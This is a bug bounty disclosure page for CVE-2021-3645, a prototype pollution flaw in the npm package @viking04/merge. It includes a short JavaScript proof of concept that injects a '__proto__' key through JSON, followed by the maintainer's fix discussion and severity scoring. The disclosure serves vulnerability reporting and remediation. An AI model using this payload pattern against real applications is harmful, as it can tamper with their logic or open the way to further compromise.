<html><head><meta name="color-scheme" content="light dark"></head><body><pre style="word-wrap: break-word; white-space: pre-wrap;">Title: The world’s first bug bounty platform for AI/ML

URL Source: http://sg3i7zdom.hb-bkt.clouddn.com/2021/CVE-2021-3645/CVE-2021-3645_ref_huntr_ef387a9e-ca3c-4c21-80e3-d34a6a896262.html

Markdown Content:

huntr - The world’s first bug bounty platform for AI/ML
===============


*   [![Image 1: logo](http://sg3i7zdom.hb-bkt.clouddn.com/horizontal-logo-wh.svg)](http://sg3i7zdom.hb-bkt.clouddn.com/)
*   [Bounties](http://sg3i7zdom.hb-bkt.clouddn.com/bounties)
*   Community
*   Info
    [SUBMIT REPORT](http://sg3i7zdom.hb-bkt.clouddn.com/bounties/disclose)

Prototype Pollution in [viking04/merge](https://github.com/viking04/merge)
==========================================================================

ValidReported on Sep 8th 2021

* * *

✍️ Description
==============

The npm package @viking04/merge is vulnerable to Prototype Pollution. More Details on the Vulnerability: https://medium.com/node-modules/what-is-prototype-pollution-and-why-is-it-such-a-big-deal-2dd8d89a93c

🕵️‍♂️ Proof of Concept
=======================

[LIVE POC LINK](https://runkit.com/embed/yxfqr9rw7jm4)

```
var merge = require("@viking04/merge")
var a = {"a":{"red":"apple"}}
var b = {"b":{"yellow":"mango"}}
var c = JSON.parse('{"__proto__":{"polluted":true}}')
console.log("Before:"+{}.polluted)
merge(a,b,c)
console.log("After:"+{}.polluted)
```

Output
======

```
"Before:undefined"
"After:true"
```

💥 Impact
=========

May lead to DOS/Remote Code Execution/Changing Business Logic/Information Disclosure/XSS depending on case.

Occurrences
===========

[![Image 2: javascript](http://sg3i7zdom.hb-bkt.clouddn.com/extensions/javascript.svg)index.js L6](https://github.com/Viking04/merge/blob/e240f760aaea85d1595edbbf550a80ce0336760e/index.js#L6)

We created a [GitHub Issue](https://github.com/viking04/merge/issues/1) asking the maintainers to create a `SECURITY.md`3 years ago

[![Image 3: jayateertha043](http://sg3i7zdom.hb-bkt.clouddn.com/_next/image?url=https%3A%2F%2Favatars.githubusercontent.com%2Fu%2F26671870%3Fv%3D4&amp;w=96&amp;q=75)](http://sg3i7zdom.hb-bkt.clouddn.com/users/jayateertha043)

[Jayateertha Guruprasad](http://sg3i7zdom.hb-bkt.clouddn.com/users/jayateertha043) submitted a

[patch](https://github.com/viking04/merge/compare/HEAD...jayateertha043:main)

3 years ago

[![Image 4: viking04](http://sg3i7zdom.hb-bkt.clouddn.com/_next/image?url=https%3A%2F%2Favatars.githubusercontent.com%2Fu%2F76390519%3Fv%3D4&amp;w=96&amp;q=75)](http://sg3i7zdom.hb-bkt.clouddn.com/users/viking04)

[viking04](http://sg3i7zdom.hb-bkt.clouddn.com/users/viking04)

commented3 years ago

Maintainer

* * *

Good one, Didn't think of this case ,will need to retest and fix it. Does filtering key with `__proto__` and `constructor`fix this completely ?

[![Image 5: viking04](http://sg3i7zdom.hb-bkt.clouddn.com/_next/image?url=https%3A%2F%2Favatars.githubusercontent.com%2Fu%2F76390519%3Fv%3D4&amp;w=96&amp;q=75)](http://sg3i7zdom.hb-bkt.clouddn.com/users/viking04)

[viking04](http://sg3i7zdom.hb-bkt.clouddn.com/users/viking04)&nbsp;validated this vulnerability3 years ago

[jayateertha043](http://sg3i7zdom.hb-bkt.clouddn.com/users/jayateertha043)has been awarded the disclosure bounty

The fix bounty is now up for grabs

[![Image 6: viking04](http://sg3i7zdom.hb-bkt.clouddn.com/_next/image?url=https%3A%2F%2Favatars.githubusercontent.com%2Fu%2F76390519%3Fv%3D4&amp;w=96&amp;q=75)](http://sg3i7zdom.hb-bkt.clouddn.com/users/viking04)

[viking04](http://sg3i7zdom.hb-bkt.clouddn.com/users/viking04)marked this as fixedwith commit[baba40](https://www.github.com/viking04/merge/commit/baba40332080b38b33840d2614df6d4142dedaf6)3 years ago

[viking04](http://sg3i7zdom.hb-bkt.clouddn.com/users/viking04)has been awarded the fix bounty

[![Image 7: jamieslome](http://sg3i7zdom.hb-bkt.clouddn.com/_next/image?url=https%3A%2F%2Favatars.githubusercontent.com%2Fu%2F55323451%3Fv%3D4&amp;w=96&amp;q=75)](http://sg3i7zdom.hb-bkt.clouddn.com/users/jamieslome)

[Jamie Slome](http://sg3i7zdom.hb-bkt.clouddn.com/users/jamieslome)

commented3 years ago

* * *

CVE published! 🎉

Sign in&nbsp;to join this conversation

CVE  

[CVE-2021-3645](https://nvd.nist.gov/vuln/detail/CVE-2021-3645)(published)

Vulnerability Type

[CWE-1321: Prototype Pollution](https://cwe.mitre.org/data/definitions/1321.html)

Severity

Medium (6.8)

Attack vectorNetwork

Attack complexityHigh

Privileges requiredNone

User interactionRequired

ScopeUnchanged

ConfidentialityHigh

IntegrityHigh

AvailabilityNone

[Open in visual CVSS calculator](https://cvss.js.org/#CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N)

Registry  

Affected Version  
\*

Visibility  
Public

Status  
Fixed

Found by

Fixed by

Supported by&nbsp;[Protect AI](https://protectai.com/?__hstc=183267385.600c38636c17ab3eab7ca29be19b51ba.1720308916905.1720308916905.1720308916905.1&amp;__hssc=183267385.1.1720308916906&amp;__hsfp=426749492)&nbsp;and leading the way to [MLSecOps](https://mlsecops.com/?__hstc=183267385.600c38636c17ab3eab7ca29be19b51ba.1720308916905.1720308916905.1720308916905.1&amp;__hssc=183267385.1.1720308916906&amp;__hsfp=426749492) and greater AI security.

[](https://huntr.com/discord?__hstc=183267385.600c38636c17ab3eab7ca29be19b51ba.1720308916905.1720308916905.1720308916905.1&amp;__hssc=183267385.1.1720308916906&amp;__hsfp=426749492)[](https://infosec.exchange/@huntr_ai)[](https://mlsecops.com/podcast?__hstc=183267385.600c38636c17ab3eab7ca29be19b51ba.1720308916905.1720308916905.1720308916905.1&amp;__hssc=183267385.1.1720308916906&amp;__hsfp=426749492)[](https://www.linkedin.com/company/huntrai/)[](https://twitter.com/huntr_ai)

© 2024

[Privacy Policy](http://sg3i7zdom.hb-bkt.clouddn.com/privacy)[Terms of Service](http://sg3i7zdom.hb-bkt.clouddn.com/terms)[Code of Conduct](http://sg3i7zdom.hb-bkt.clouddn.com/code-of-conduct)[Cookie Preferences](http://sg3i7zdom.hb-bkt.clouddn.com/2021/CVE-2021-3645/CVE-2021-3645_ref_huntr_ef387a9e-ca3c-4c21-80e3-d34a6a896262.html#)[Contact Us](http://sg3i7zdom.hb-bkt.clouddn.com/contact-us)
</pre></body></html>